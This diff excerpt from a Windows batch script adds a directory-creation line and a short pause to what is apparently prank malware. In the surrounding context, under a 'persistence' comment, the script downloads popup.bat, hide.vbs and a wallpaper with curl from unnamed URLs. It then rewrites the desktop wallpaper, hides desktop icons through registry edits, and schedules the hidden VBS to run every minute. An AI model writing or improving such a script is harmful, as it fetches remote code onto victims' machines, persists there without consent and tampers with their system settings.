@@ -8,6 +8,7 @@ set "Script1=C:\temp\popup.bat"
 set "Script2=C:\temp\hide.vbs"
 
 :: persistence
+if not exist "C:\temp\" mkdir C:\temp
 curl -L -o %Script1% %url1%
 curl -L -o %Script2% %url2%
 curl -L -o %wallpaperpath% %wallpaperurl%
@@ -19,6 +20,7 @@ powershell -command "&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explor
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %wallpaperpath% /f
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+timeout 3
 
 :: schtask for popup.bat
 schtasks /Create /TN "%TaskName%" /TR "%Script2%" /SC MINUTE /MO 1 /RL LIMITED /F
